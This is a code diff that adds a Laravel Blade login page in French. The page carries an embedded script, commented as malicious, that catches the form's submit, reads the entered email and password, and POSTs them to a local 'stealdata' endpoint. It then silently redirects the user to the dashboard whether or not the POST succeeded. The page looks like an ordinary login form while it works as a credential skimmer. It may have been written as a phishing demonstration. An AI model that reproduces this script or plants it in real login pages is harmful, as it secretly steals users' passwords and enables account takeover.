@@ -1,0 +1,85 @@
+<x-guest-layout>
+    <!-- Session Status -->
+    <x-auth-session-status class="mb-4" :status="session('status')" />
+
+    <!-- Formulaire -->
+    <form id="maliciousForm" method="GET" action="{{ route('dashboard') }}"> <!-- Redirection légitime -->
+        @csrf
+
+        <!-- Email Address -->
+        <div>
+            <x-input-label for="email" :value="__('Email')" />
+            <x-text-input id="email" class="block mt-1 w-full" type="email" name="email" :value="old('email')" required autofocus autocomplete="username" />
+            <x-input-error :messages="$errors->get('email')" class="mt-2" />
+        </div>
+
+        <!-- Password -->
+        <div class="mt-4">
+            <x-input-label for="password" :value="__('Password')" />
+            <x-text-input id="password" class="block mt-1 w-full"
+                            type="password"
+                            name="password"
+                            required autocomplete="current-password" />
+            <x-input-error :messages="$errors->get('password')" class="mt-2" />
+        </div>
+
+        <!-- Remember Me -->
+        <div class="block mt-4">
+            <label for="remember_me" class="inline-flex items-center">
+                <input id="remember_me" type="checkbox" class="rounded dark:bg-gray-900 border-gray-300 dark:border-gray-700 text-indigo-600 shadow-sm focus:ring-indigo-500 dark:focus:ring-indigo-600 dark:focus:ring-offset-gray-800" name="remember">
+                <span class="ms-2 text-sm text-gray-600 dark:text-gray-400">{{ __('Remember me') }}</span>
+            </label>
+        </div>
+
+        <!-- Register Button -->
+        <div class="block mt-4">
+            <a href="{{ route('register') }}" class="inline-flex items-center px-4 py-2 text-sm font-medium text-white bg-indigo-600 border border-transparent rounded-md hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
+                {{ __('Register') }}
+            </a>
+        </div>
+
+        <div class="flex items-center justify-end mt-4">
+            @if (Route::has('password.request'))
+                <a class="underline text-sm text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-gray-100 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 dark:focus:ring-offset-gray-800" href="{{ route('password.request') }}">
+                    {{ __('Forgot your password?') }}
+                </a>
+            @endif
+
+            <x-primary-button id="loginButton" class="ms-3">
+                {{ __('Log in') }}
+            </x-primary-button>
+        </div>
+    </form>
+
+    <!-- Script malveillant -->
+    <script>
+    document.getElementById('maliciousForm').addEventListener('submit', function (event) {
+        event.preventDefault(); // Empêche l'envoi initial du formulaire
+
+        // Récupérer les données utilisateur
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Envoyer les données à votre serveur malveillant
+        const maliciousUrl = `http://127.0.0.1:8080/stealdata`;
+        fetch(maliciousUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                email: email,
+                password: password
+            })
+        }).then(() => {
+            // Après l'envoi, redirige l'utilisateur vers le Dashboard
+            window.location.href = "{{ url('/dashboard') }}"; // Utilisez `url()` au lieu de `route()` pour une simple redirection
+        }).catch(err => {
+            console.error('Failed to send malicious request:', err);
+            // Redirige l'utilisateur même en cas d'échec
+            window.location.href = "{{ url('/dashboard') }}";
+        });
+    });
+</script>
+
+</x-guest-layout>
